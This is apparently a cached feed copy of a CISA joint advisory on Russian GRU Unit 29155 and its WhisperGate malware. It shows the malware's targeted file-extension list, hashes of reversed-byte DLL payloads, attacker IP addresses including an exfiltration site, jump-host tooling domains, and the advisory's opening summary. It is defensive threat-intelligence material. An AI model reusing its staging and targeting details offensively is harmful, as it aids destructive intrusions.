<td>u\".PAQ\"</td>
<td>u\".PAS\"</td>
</tr>
<tr>
<td>u\".PDF\"</td>
<td>u\".PEM\"</td>
<td>u\".PFX\"</td>
<td>u\".PHP\"</td>
<td>u\".PHP3\"</td>
<td>u\".PHP4\"</td>
</tr>
<tr>
<td>u\".PHP5\"</td>
<td>u\".PHP6\"</td>
<td>u\".PHP7\"</td>
<td>u\".PHPS\"</td>
<td>u\".PHTML\"</td>
<td>u\".PNG\"</td>
</tr>
<tr>
<td>u\".POT\"</td>
<td>u\".POTM\"</td>
<td>u\".POTX\"</td>
<td>u\".PPAM\"</td>
<td>u\".PPK\"</td>
<td>u\".PPS\"</td>
</tr>
<tr>
<td>u\".PPSM\"</td>
<td>u\".PPSX\"</td>
<td>u\".PPT\"</td>
<td>u\".PPTM\"</td>
<td>u\".PPTM\"</td>
<td>u\".PPTX\"</td>
</tr>
<tr>
<td>u\".PS1\"</td>
<td>u\".PSD\"</td>
<td>u\".PST\"</td>
<td>u\".RAR\"</td>
<td>u\".RAW\"</td>
<td>u\".RTF\"</td>
</tr>
<tr>
<td>u\".SAV\"</td>
<td>u\".SCH\"</td>
<td>u\".SHTML\"</td>
<td>u\".SLDM\"</td>
<td>u\".SLDX\"</td>
<td>u\".SLK\"</td>
</tr>
<tr>
<td>u\".SLN\"</td>
<td>u\".SNT\"</td>
<td>u\".SQ3\"</td>
<td>u\".SQL\"</td>
<td>u\".SQLITE3\"</td>
<td>u\".SQLITEDB\"</td>
</tr>
<tr>
<td>u\".STC\"</td>
<td>u\".STD\"</td>
<td>u\".STI\"</td>
<td>u\".STW\"</td>
<td>u\".SUO\"</td>
<td>u\".SVG\"</td>
</tr>
<tr>
<td>u\".SXC\"</td>
<td>u\".SXD\"</td>
<td>u\".SXI\"</td>
<td>u\".SXM\"</td>
<td>u\".SXW\"</td>
<td>u\".TAR\"</td>
</tr>
<tr>
<td>u\".TBK\"</td>
<td>u\".TGZ\"</td>
<td>u\".TIF\"</td>
<td>u\".TIFF\"</td>
<td>u\".TXT\"</td>
<td>u\".UOP\"</td>
</tr>
<tr>
<td>u\".UOT\"</td>
<td>u\".VBS\"</td>
<td>u\".VCD\"</td>
<td>u\".VDI\"</td>
<td>u\".VHD\"</td>
<td>u\".VMDK\"</td>
</tr>
<tr>
<td>u\".VMEM\"</td>
<td>u\".VMSD\"</td>
<td>u\".VMSN\"</td>
<td>u\".VMSS\"</td>
<td>u\".VMTM\"</td>
<td>u\".VMTX\"</td>
</tr>
<tr>
<td>u\".VMX\"</td>
<td>u\".VMXF\"</td>
<td>u\".VSD\"</td>
<td>u\".VSDX\"</td>
<td>u\".VSWP\"</td>
<td>u\".WAR\"</td>
</tr>
<tr>
<td>u\".WB2\"</td>
<td>u\".WK1\"</td>
<td>u\".WKS\"</td>
<td>u\".XHTML\"</td>
<td>u\".XLC\"</td>
<td>u\".XLM\"</td>
</tr>
<tr>
<td>u\".XLS\"</td>
<td>u\".XLSB\"</td>
<td>u\".XLSM\"</td>
<td>u\".XLSM\"</td>
<td>u\".XLSX\"</td>
<td>u\".XLT\"</td>
</tr>
<tr>
<td>u\".XLTM\"</td>
<td>u\".XLTX\"</td>
<td>u\".XLW\"</td>
<td>u\".YML\"</td>
<td>u\".ZIP\"</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<h4><strong>Malware Related to Tbopbh.jpg</strong></h4>
<p><code>stage2.exe</code> and its respective payload, <code>Tbopbh.jpg</code>, served as a template for other malware within Discord Cluster 1. While most of these other malware files have not been observed in open source reporting, malware analysts assess them as payloads that follow the unravelling process listed in <strong>Figure 1</strong> below.</p>



<figure class=\"c-figure c-figure--image\" role=\"group\">
  
  <div class=\"c-figure__media\">    <img loading=\"lazy\" src=\"/sites/default/files/styles/large/public/2024-09/Figure%201%20-%20stage2.exe%20Execution%20Process%20Template.png?itok=0BWq6sPC\" width=\"1024\" height=\"619\" alt=\"Figure 1 - stage2.exe Execution Process Template\">



</div>
      <figcaption class=\"c-figure__caption\"><em>Figure 1: stage2.exe Execution Process Template</em></figcaption>
  </figure>
<p><strong>Table 26</strong> below provides a list of MD5 hashes for files found within Discord Cluster 1. When reversed, these files become DLL files, which were structured similarly to <code>Frkmlkdkdubkznbkmcf.dll</code>.</p>
<p><strong>Note:</strong> Analysts identified the files below in Discord Cluster 1; the files are staged on the Cluster in reversed byte order. Analysts reversed the file byte order for each file into their proper portable executable format, e.g., “Functional” format. The hashes in <strong>Table 26</strong> represent both byte orders.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 26: Files Located in Discord Cluster 1</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Filename</th>
<th role=\"columnheader\">MD5 (Reversed)</th>
<th role=\"columnheader\">MD5 (Functional)</th>
</tr>
</thead>
<tbody>
<tr>
<td>Afgyyppsysmtddhvhhaw.dll</td>
<td>d034fe4c71b16b6d331886c24fef2751</td>
<td>4074798a621232dc448b65db7b1fdd66</td>
</tr>
<tr>
<td>Avbbwys.dll</td>
<td>422437f326b8dbe30cc5f103bde31f26</td>
<td>7f84263fd24f783ff72d5ae91011b558</td>
</tr>
<tr>
<td>Azkebvoyswvjnrpmn.dll</td>
<td>562c337b8caca330da2ea6ae07ee5db6</td>
<td>f73d203bdf924658fd6edf3444c93a50</td>
</tr>
<tr>
<td>Budoejokuqbge.dll</td>
<td>58e879213d81333b628434ba4aeb2751</td>
<td>08dfebc04eb61c9a6d87b6524c1c0f2e</td>
</tr>
<tr>
<td>Bwqdffttejlkeqe.dll</td>
<td>1c85c0d044ac837e8939564afac1eb32</td>
<td>8633bd2bbbb5da22c3f8751150186c42</td>
</tr>
<tr>
<td>Bxqbsyxfkjzmhdtfceoak.dll</td>
<td>7234da8ceafbe6586469f18c03cc1832</td>
<td>5f4df6dd8e644d59eaf182e500b5e7bf</td>
</tr>
<tr>
<td>Clsrncpbaucrabuobcpale.dll</td>
<td>618d62dd95fd9aeb855fe2ef1403dce5</td>
<td>955e4c198ee58e40fe92cb74ceefdf00</td>
</tr>
<tr>
<td>Cpdvzvzyghy.dll</td>
<td>d40195a444526eafb0db56d95bf8655d</td>
<td>a905d620717f75751aa94ceb88995dbc</td>
</tr>
<tr>
<td>Ctiktdfyauejxfak.dll</td>
<td>d06761b2cff86035a4838110ed6ab622</td>
<td>2ca6bcf16ee4293a771a1cf7b7b9ee49</td>
</tr>
<tr>
<td>Czxhayyankwsp.dll</td>
<td>59da31da4db1aa5f9a5c7c0c151422c8</td>
<td>de1bf141976776becd376a0dac400df6</td>
</tr>
<tr>
<td>Djpajq.dll</td>
<td>de1f9d1f0336ddcff832ad3900acd2f1</td>
<td>974e7c0b3660fbf18f29eac059f85ac0</td>
</tr>
<tr>
<td>Dmdtflkcgebf.dll</td>
<td>394e056cb6cb732dfd5e0d45d3dae938</td>
<td>4d8343c40be53d6521244fe74393d937</td>
</tr>
<tr>
<td>Ejcpaujkmvjndgqznimmkgd.dll</td>
<td>b7c1a8d39f46eaf52be90e24565dd6b0</td>
<td>7a70d5fbbafe3454b76e3ad2f009618f</td>
</tr>
<tr>
<td>Encuutwvdqbxlxh.dll</td>
<td>2b39eab325906b0a3ab7e584c3d67349</td>
<td>df4f856f783d23fb01af1e0e64bc0e20</td>
</tr>
<tr>
<td>Esalfjyraquwfxcgufwzip.dll</td>
<td>80f0ee332a452172533ad8863bb3bc63</td>
<td>f4f4e55a00d2f3a433c9e5624285ac1c</td>
</tr>
<tr>
<td>Fdgofjdvmmllgsxunb.dll</td>
<td>9345425cf07b4c39a80cd8540e08bfde</td>
<td>eef2363744345741e09fe5380eeb4df3</td>
</tr>
<tr>
<td>Fkhzvcuucaprsibp.dll</td>
<td>aecb57e20d2c0b0d9fece2cbcbcc3459</td>
<td>4bce4831b1dd71f19c55b3e3b5e99856</td>
</tr>
<tr>
<td>Fkthhyexkr.dll</td>
<td>58dc7c9577ff90a046359ca255c0c9f4</td>
<td>19cb20c4e7dbfe15c1aa284752d0fecb</td>
</tr>
<tr>
<td>Fqattuyxknkhv.dll</td>
<td>5c9e2195d10375b746b6717fdb47b5b9</td>
<td>2b5f159f022109a8de1bc5dd9e3138a0</td>
</tr>
<tr>
<td>Fqyubbzbubsge.dll</td>
<td>afbb9459d4a0f60d7ffb3b3532d11bc2</td>
<td>8d3d4d702ba6b4be2766a41bfe5ff76e</td>
</tr>
<tr>
<td>Frkmlkdkdubkznbkmcf.dll</td>
<td>b3370eb3c5ef6c536195b3bea0120929</td>
<td>e61518ae9454a563b8f842286bbdb87b</td>
</tr>
<tr>
<td>Gsiook.dll</td>
<td>a1b509254a0a1daa7e00d279ec974461</td>
<td>0e03103e8110785156105946e48ea9e0</td>
</tr>
<tr>
<td>Gutjuhi.dll</td>
<td>791a81f31a8e7090a7d5417451e09efa</td>
<td>fba76f4eb2e7a2eb17193bebe290a198</td>
</tr>
<tr>
<td>Hisvswmeswmnqbvzpoxzx.dll</td>
<td>e1a15bc13157134f542cd9c55c742460</td>
<td>c9d1677f4f89b95b41591b23a1dc1a63</td>
</tr>
<tr>
<td>Hsoahb.dll</td>
<td>cd62d4a178705b2b90a8babd8613df93</td>
<td>032f5642d4fb2fdd74e6f20a13c57746</td>
</tr>
<tr>
<td>Icyjkszdzgoxdfuwptkwxo.dll</td>
<td>f34f60375bebad861a35b7c4bb0fa1c8</td>
<td>a66b3b22a3619f739b197d0d443b700c</td>
</tr>
<tr>
<td>Jdfzavlqr.dll</td>
<td>7fe7f33d9b5dbdf3d032d2a10e39f283</td>
<td>8cfef66b390f08bdbfd940922cf51650</td>
</tr>
<tr>
<td>Jrdggfjvve.dll</td>
<td>b32e14a9b7de6c92cd16758fa6e23346</td>
<td>1220b580cef1bf22351e271773945d20</td>
</tr>
<tr>
<td>Jteieurqgvpgnhw.dll</td>
<td>b85538f665fdb6c8d9a74f2df7369832</td>
<td>ffa68749aa3fc6495e2c49b01d964339</td>
</tr>
<tr>
<td>Kbuqtmznmodjzvxvwxcvho.dll</td>
<td>869742fb9db71fdb66f00528fe2966ec</td>
<td>5b884f15dc9b072d7bbad9ec2b249f38</td>
</tr>
<tr>
<td>Kdmvyizz.dll</td>
<td>2128361d8aaae1225d50c9add32006a1</td>
<td>9152c9de57b5647ee4ab3dff551dc8dd</td>
</tr>
<tr>
<td>Kfxghcmg.dll</td>
<td>56e0446a6d7175a0d09110bc483ddbed</td>
<td>fc418fdda06ce5982153766dcefb71d9</td>
</tr>
<tr>
<td>Krewcizfplntbwcqawfhtfpd.dll</td>
<td>6a4fca88ee36fecc5113e188cc39d25c</td>
<td>5c3b0040e2dece6e17093ae607b79044</td>
</tr>
<tr>
<td>Lsurhpmpyewhv.dll</td>
<td>143594597130e301499e5940a5fb798a</td>
<td>911c7e82f32f78577dcd725a7adb114d</td>
</tr>
<tr>
<td>Mbkzrkfasxgxtzhgpgsehip.dll</td>
<td>993f01861aff306df44e6475f7886f37</td>
<td>e4634ef9bfe7b598b857ad997445b239</td>
</tr>
<tr>
<td>Mhnovdgzzidqx.dll</td>
<td>64b9feeccf6c183b9f7138f8fc53acbb</td>
<td>7e0c42d33921a89724424f17c97037bd</td>
</tr>
<tr>
<td>Mlfampnfnmjvjnahkrawwqd.dll</td>
<td>ddec2d79f460a881849037336ba8968f</td>
<td>d973210977957209f255b58eb1715b12</td>
</tr>
<tr>
<td>Mppveiyannobrcdlkd.dll</td>
<td>9606b4720a0e73ef1f00505a11aab2f7</td>
<td>0adc2530cf348c0a3d53a680291a3d67</td>
</tr>
<tr>
<td>Mzhyeemgqbmamubqn.dll</td>
<td>f772f5c65d65412f61ef5f2660e33ceb</td>
<td>f8ffd1eab6223e31b15d0fd6c3c0472e</td>
</tr>
<tr>
<td>Nbbudwt.dll</td>
<td>875f9200b49db08c33962b0a6bd05ab9</td>
<td>2e035360971a817b854d7d5a2b008717</td>
</tr>
<tr>
<td>Nhqcfzagulwaw.dll</td>
<td>fa97dbe84ce7717b754795fa89f13dce</td>
<td>601c12596dfea84c2113ae5ee59a52ec</td>
</tr>
<tr>
<td>Nlzhpvuzzoycqnnpl.dll</td>
<td>d8c04ecd646a1f8537a59f63518ef3c6</td>
<td>47f4534da421daf8089cf34d53f6bb6e</td>
</tr>
<tr>
<td>Noubvdigjlwsnqiylzgikkk.dll</td>
<td>3bcff990faacbebb8fb470dfe03e2543</td>
<td>683546b9171a1ea284a96d1b45d1d823</td>
</tr>
<tr>
<td>Nvxwbzciqarteyuz.dll</td>
<td>c265188fdadddb648629e8060601dca7</td>
<td>af85885a74cfe099676af542dcdc5741</td>
</tr>
<tr>
<td>Nykfvwmchighqwcguabvgq.dll</td>
<td>8a2ba7f9cb6f65edf65dbe579907551e</td>
<td>673586594242d99ab02118595e457297</td>
</tr>
<tr>
<td>Ofgdwttnmqibnmpqx.dll</td>
<td>9657c2ef6ed5229740b125df9ca6c915</td>
<td>0dc5ac12f7690db15c99eaabc11b129c</td>
</tr>
<tr>
<td>Ohtvepefcjnchrrasokn.dll</td>
<td>a5494ffd9efb7c3df59c527076a05e62</td>
<td>e2cc52273d56ed66c800a726760c1ed0</td>
</tr>
<tr>
<td>Olkscszculdbzvco.dll</td>
<td>85afdef18d65b0518d709a5a324ea57a</td>
<td>77675a24040f10c85112d9a219d5f1c7</td>
</tr>
<tr>
<td>Onkwzkpfuqazvali.dll</td>
<td>da4d81f9ef3b25ea09f34481d923dd9d</td>
<td>cc4a9db6f250114e26d8d9ba6ab46bc9</td>
</tr>
<tr>
<td>Opaqwrazeyyilbbjlkf.dll</td>
<td>0e6374042b33d78329149a6189a7cb46</td>
<td>1934e2ebc64d41e37ef53ea0c075e974</td>
</tr>
<tr>
<td>Owxtabfdqhkaahhwsgkatuu.dll</td>
<td>d33f608f561096be24cba91797e0da2f</td>
<td>332b7f6662e28e3577bd1b269904b940</td>
</tr>
<tr>
<td>Poezcjhvkzgmnyqljpbte.dll</td>
<td>32db8abce1618e60441f5c7cf4be0d22</td>
<td>2b2509c6ee46d6327f2f1c9a75122d15</td>
</tr>
<tr>
<td>Rvyqctymumtudroyae.dll</td>
<td>dd2431b1f858b4ca14a4ea05fb8c4a06</td>
<td>9b2924c727aa3a061906321a66c9050c</td>
</tr>
<tr>
<td>Sutragevr.dll</td>
<td>7d3b529db1bd896d9fd877b85cafdc64</td>
<td>de276cf07ccffa18d7ffc35281bca910</td>
</tr>
<tr>
<td>Sxkdxclqmxnmjgedhgagl.dll</td>
<td>6e1394938c2fecad2d4f5b3bcf357ec0</td>
<td>d6b41747cb035c4c2b08790cd57f0626</td>
</tr>
<tr>
<td>Tosyxesxgrzyb.dll</td>
<td>99305ce01cc2d0f58cd226efb2de893f</td>
<td>6859fe5a3eead00a563cd93efcc6ea96</td>
</tr>
<tr>
<td>Tpmnkauftdydomyz.dll</td>
<td>6c152774f6894407075e6f0a2859bbae</td>
<td>981160dee6cd25fb181e54eca7ff7c22</td>
</tr>
<tr>
<td>Tptjtwfhpsjfksqoajt.dll</td>
<td>343b140977b3f9b227e7e5f82b0fadb5</td>
<td>95cf2a5a24b0d33d621bb8995d5826bc</td>
</tr>
<tr>
<td>Tsgblplhdwwj.dll</td>
<td>54a9fa9eb337a3b5ca7b0fa4553e439d</td>
<td>cee5acbfef7e76f52f40b8ae95199c50</td>
</tr>
<tr>
<td>Uqhznlcagzyoqrbyylnnwn.dll</td>
<td>4c19aeecbfca13b8a199703d8b8284b9</td>
<td>ad0ca738aa6c987e4ee1a87ff2b8acd5</td>
</tr>
<tr>
<td>Uslrfkxccdyetfdxmaokbhv.dll</td>
<td>dc795cb9290b1bc0b7fb1ce9d6ae7c93</td>
<td>552d9b79cc544fc6c3e8aa204dd00811</td>
</tr>
<tr>
<td>Waordspinycera.dll</td>
<td>9935a86108e3ae3f72cd15817601dcc6</td>
<td>5d063eecd894d3d523875bc82ef6f319</td>
</tr>
<tr>
<td>Wcfsobntsczz.dll</td>
<td>77aa3f342a0d69fda67c853bcc004d48</td>
<td>d0b00a6c83ce810ec2763af17e8ab1c4</td>
</tr>
<tr>
<td>Wpqyhvfnunlabx.dll</td>
<td>03af632aa6f87bf9dd4364ee3b612cbb</td>
<td>9f11e915be5c0d02a3130329cf032a28</td>
</tr>
<tr>
<td>Wqwpawlulyrsrjcbvuvddeud.dll</td>
<td>41871fef433d7b4b89fd226fe3a1a2c0</td>
<td>e21fe98cc8866c0eeecf3549ebcec751</td>
</tr>
<tr>
<td>Wqxpgvsgvhygmfbziucxcuh.dll</td>
<td>246d9f9831b125ea7e6ef21bc4c8a0ca</td>
<td>dea3ae8225913dd98148fc86cfc3bcbe</td>
</tr>
<tr>
<td>Xgcpgrxhchgwz.dll</td>
<td>9c695be3703194fdb71c212a0832bcf3</td>
<td>8744cec7547b1e73705c10a264e28e08</td>
</tr>
<tr>
<td>Xgkepoc.dll</td>
<td>69e58c5ee69f5e5e8a58f4afdd59adfe</td>
<td>d43446b4a22a597b93b559821ee5ac9b</td>
</tr>
<tr>
<td>Xlfthpiq.dll</td>
<td>540ee8e39150c539fea582b0e77be7b0</td>
<td>3fe96ff4a5ef0f5346ce645a2a893597</td>
</tr>
<tr>
<td>Xlocky.dll</td>
<td>0a2affa6d895baab087b84e93145da35</td>
<td>246f31c86bbbe7f65c0126cf4a1a947a</td>
</tr>
<tr>
<td>Xqblktvxmnxrzwiuqdfxzrd.dll</td>
<td>569c1d31f4c7ec7701d8e4e51b59fe85</td>
<td>5eaa7e812733a5c8cda734fab2f752d5</td>
</tr>
<tr>
<td>Xykqrksoqqgyuckfc.dll</td>
<td>09a2d85e809d36bff82bd5ab773980a3</td>
<td>96964aed18f65a7acae632f358a093f6</td>
</tr>
<tr>
<td>Yawyjonk.dll</td>
<td>3ccf799ff208981349cee4fb1a1cf88c</td>
<td>4e9c55c6fe25d61ca4394de794546fab</td>
</tr>
<tr>
<td>Yrknbt.dll</td>
<td>6154760e602bd71192d93f72fbdb486e</td>
<td>94bf96b76c2a092de8962496ce35deaf</td>
</tr>
<tr>
<td>Yvbmuigfihprdxgiirp.dll</td>
<td>b0d0a23766fa64ece9315f37b28bb4c0</td>
<td>1e22d64f263e8ea4b2d37dcd9b7c3012</td>
</tr>
<tr>
<td>Ywrovtjimixpmizuln.dll</td>
<td>ca43a241042b5fcc305393765ae18e69</td>
<td>28d571ddb5c04d065dfe1be9604663ba</td>
</tr>
<tr>
<td>Zfgdccnwnee.dll</td>
<td>251f3a4757d9e4de0499cc30c0bc00a9</td>
<td>755dac7edd17fbf5b5c449dd06c02e14</td>
</tr>
<tr>
<td>Zkuxhxwbvifejn.dll</td>
<td>9d7ab8b0aa669125d9a5adc4f46c56f3</td>
<td>af277ae0fbf6cc20f887696ea4756d46</td>
</tr>
<tr>
<td>Zsdflpivel.dll</td>
<td>a9c9c0be8eca3b575c24da0fcf1af1a9</td>
<td>1cac5c0cb8801e8730447023270d8d56</td>
</tr>
</tbody>
</table>
</div>
<h2><strong>Appendix B: Indicators of Compromise</strong></h2>
<p><strong>Table 27</strong> lists observed IP addresses that were first observed as early as 2022 and have been historically linked to Unit 29155 infrastructure. These IPs are considered historical infrastructure and should be investigated for associated abnormal or malicious activity.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 27: IP Addresses Associated with Unit 29155 Infrastructure</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">IP Address</th>
</tr>
</thead>
<tbody>
<tr>
<td>5.226.139[.]66</td>
</tr>
<tr>
<td>45.141.87[.]11</td>
</tr>
<tr>
<td>46.101.242[.]222</td>
</tr>
<tr>
<td>62.173.140[.]223</td>
</tr>
<tr>
<td>79.124.8[.]66</td>
</tr>
<tr>
<td>90.131.156[.]107</td>
</tr>
<tr>
<td>112.51.253[.]153</td>
</tr>
<tr>
<td>112.132.218[.]45</td>
</tr>
<tr>
<td>154.21.20[.]82</td>
</tr>
<tr>
<td>179.43.133[.]202</td>
</tr>
<tr>
<td>179.43.142[.]42</td>
</tr>
<tr>
<td>179.43.162[.]55</td>
</tr>
<tr>
<td>179.43.175[.]38</td>
</tr>
<tr>
<td>179.43.175[.]108 (data exfiltration site)</td>
</tr>
<tr>
<td><a>179.43.176[.]60</a></td>
</tr>
<tr>
<td>179.43.187[.]47</td>
</tr>
<tr>
<td>179.43.189[.]218</td>
</tr>
<tr>
<td>185.245.84[.]227</td>
</tr>
<tr>
<td>185.245.85[.]251</td>
</tr>
<tr>
<td>194.26.29[.]84</td>
</tr>
<tr>
<td>194.26.29[.]95</td>
</tr>
<tr>
<td>194.26.29[.]98</td>
</tr>
<tr>
<td>194.26.29[.]251</td>
</tr>
</tbody>
</table>
<p>Threat actors can exploit jump hosts, also known as jump servers or bastion hosts, to gain unauthorized access or perform malicious activities within a protected network. In this context, the domains listed in <strong>Table 28</strong> represent the tools used to establish functionality for creating a jump host.</p>
<div>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 28: Domains Hosting Jump Host Tooling</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\">Domain Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>interlinks[.]top</td>
</tr>
<tr>
<td>https://3proxy[.]ru</td>
</tr>
<tr>
<td>https://ngrok[.]com (<strong>Note:</strong> This domain is a legitimate service leveraged for malicious purposes by Unit 29155 cyber actors and should be investigated prior to blocking.)</td>
</tr>
<tr>
<td>https://nssm[.]cc</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>" "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a" (26328 30310) new 3 nil nil ((title nil "Russian Military Cyber Actors Target US and Global Critical Infrastructure") (link nil "https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-249a") (description nil "<h2><strong>Summary</strong></h2>
<p>The Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), and National Security Agency (NSA) assess that cyber actors affiliated with the Russian General Staff Main Intelligence Directorate (GRU) 161st Specialist Training Center (Unit 29155) are responsible for computer network operations against global targets for the purposes of espionage, sabotage, and reputational harm since at least 2020. GRU Unit 29155 cyber actors began deploying the destructive&nbsp;<a href=\"https://attack.mitre.org/software/S0689/\" title=\"WhisperGate\">WhisperGate</a> malware against multiple Ukrainian victim organizations as early as January 13, 2022. These cyber actors are separate from other known and more established GRU-affiliated cyber groups, such as Unit 26165 and Unit 74455.</p>
<p>To mitigate this malicious cyber activity, organizations should take the following actions today:</p>
<ul>
<li>Prioritize routine system updates and remediate known exploited vulnerabilities.</li>
<li>Segment networks to prevent the spread of malicious activity.</li>
<li>Enable phishing-resistant multifactor authentication (MFA) for all externally facing account services, especially for webmail, virtual private networks (VPNs), and accounts that access critical systems.</li>
</ul>
<p>This Cybersecurity Advisory provides tactics, techniques, and procedures (TTPs) associated with Unit 29155 cyber actors<a>—</a>both during and succeeding their deployment of WhisperGate against Ukraine—as well as further analysis (see <strong>Appendix A</strong>) of the WhisperGate malware initially published in the joint advisory,&nbsp;<a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-057a\" title=\"Destructive Malware Targeting Organizations in Ukraine\">Destructive Malware Targeting Organizations in Ukraine</a>, published February 26, 2022.</p>
<p>FBI, CISA, NSA and the following partners are releasing this joint advisory as a collective assessment of Unit 29155 cyber operations since 2020:</p>
<ul>
<li>U.S. Department of the Treasury</li>
<li>U.S. Department of State (Rewards for Justice)</li>
<li>U.S. Cyber Command Cyber National Mission Force (CNMF)</li>
<li>Netherlands Defence Intelligence and Security Service (MIVD)</li>
<li>Czech Military Intelligence (VZ)</li>
<li>Czech Republic Security Information Service (BIS)</li>
<li>German Federal Office for the Protection of the Constitution (BfV)</li>
<li>Estonian Internal Security Service (KAPO)</li>
<li>Latvian State Security Service (VDD)</li>
<li>Security Service of Ukraine (SBU)</li>
<li>Computer Emergency Response Team of Ukraine (CERT-UA)</li>
<li>Canadian Security Intelligence Service (CSIS)</li>
<li>Communications Security Establishment Canada (CSE)</li>
<li>Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC)</li>
<li>United Kingdom National Cyber Security Centre (NCSC-UK)</li>
</ul>
<p>For additional information on Russian state-sponsored malicious cyber activity and related indictments, see the recent U.S. Department of Justice (DOJ) press releases for&nbsp;<a href=\"https://www.justice.gov/opa/pr/russian-national-charged-conspiring-russia-military-intelligence-destroy-ukrainian\" title=\"Russian National Charged for Conspiring with Russian Military Intelligence to Destroy Ukrainian Government Computer Systems and Data\">June 26, 2024</a>, and&nbsp;<a href=\"https://www.justice.gov/opa/pr/five-russian-gru-officers-and-one-civilian-charged-conspiring-hack-ukrainian-government\" title=\"Five Russian GRU Officers and One Civilian Charged for Conspiring to Hack Ukrainian Government\">September 5, 2024</a>, FBI’s&nbsp;<a href=\"https://www.fbi.gov/investigate/cyber\" title=\"The Cyber Threat\">Cyber Crime</a> webpage, and CISA’s&nbsp;<a href=\"https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/russia\" title=\"Russia Cyber Threat Overview and Advisories\">Russia Cyber Threat Overview and Advisories</a> webpage.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-249A Russian Military Cyber Actors Target U.S. and Global Critical Infrastructure</a>
    <span class=\"c-file__size\">(PDF,       1.01 MB
  )</span>
  </div>
</div>
<p>For a downloadable copy of indicators of compromise (IOCs):</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/AA24-249A.stix_.xml\" class=\"c-file__link\" target=\"_blank\">AA24-249A STIX XML</a>
    <span class=\"c-file__size\">(XML,       321.47 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-09/AA24-249A-Russian-Military-Cyber-Actors-Target-US-and-Global-Critical-Infrastructure.stix_.json\" class=\"c-file__link\" target=\"_blank\">AA24-249A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       201.39 KB
  )</span>
  </div>
</div>
<h2><strong>Technical Details</strong></h2>
<p><strong>Note:</strong> This advisory uses the <a href=\"https://attack.mitre.org/versions/v15/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK® Matrix for Enterprise</a> framework, version 15. See the MITRE ATT&amp;CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&amp;CK tactics and techniques.</p>
<h3>GRU Unit 29155: Cyber Component</h3>
<p>FBI, NSA, and CISA assess Unit 29155 is responsible for attempted coups, sabotage and influence operations, and assassination attempts throughout Europe. Unit 29155 expanded their tradecraft to include offensive cyber operations since at least 2020. Unit 29155 cyber actors’ objectives appear to include the collection of information for espionage purposes, reputational harm caused by the theft and leakage of sensitive information, and systematic sabotage caused by the destruction of data [<a href=\"https://attack.mitre.org/versions/v15/techniques/T1485/\" title=\"Data Destruction\">T1485</a>].</p>
<p>FBI assesses the Unit 29155 cyber actors to be junior active-duty GRU officers under the direction of experienced Unit 29155 leadership. These individuals appear to be gaining cyber experience and enhancing their technical skills through conducting cyber operations and intrusions. Additionally, FBI assesses Unit 29155 cyber actors rely on non-GRU actors, including known cyber-criminals and enablers to conduct their operations.</p>
<h3>Cybersecurity Industry Tracking</h3>
<p>The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation recommendations related to Unit 29155 cyber actors. While not all encompassing, the following are the most notable threat group names related under <a href=\"https://attack.mitre.org/groups/G1003\" title=\"Ember Bear\">MITRE ATT&amp;CK G1003</a>&nbsp;and commonly used within the cybersecurity community.</p>
<ul>
<li>Cadet Blizzard (formerly known as DEV-0586 by Microsoft)[<a href=\"https://www.microsoft.com/en-us/security/blog/2022/01/15/destructive-malware-targeting-ukrainian-organizations/\" title=\"Destructive malware targeting Ukrainian organizations\">1</a>],[<a href=\"https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/?msockid=2383e2d882c06a751a17f64383d26b64\" title=\"Cadet Blizzard emerges as a novel and distinct Russian threat actor\">2</a>]</li>
<li>Ember Bear (also known as Bleeding Bear by CrowdStrike)[<a href=\"https://www.crowdstrike.com/blog/who-is-ember-bear/\" title=\"Who is EMBER BEAR?\">3</a>]</li>
<li>Frozenvista</li>
<li>UNC2589[<a href=\"https://cloud.google.com/blog/topics/threat-intelligence/russia-invasion-ukraine-retaliation/\" title=\"Responses to Russia's Invasion of Ukraine Likely to Spur Retaliation\">4</a>]</li>
<li>UAC-0056[<a href=\"https://www.sentinelone.com/blog/threat-actor-uac-0056-targeting-ukraine-with-fake-translation-software/\">5</a>]</li>
</ul>
<p><strong>Note:</strong> Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the U.S. Government’s understanding for all activity related to these groupings.</p>
<h3>Victimization</h3>
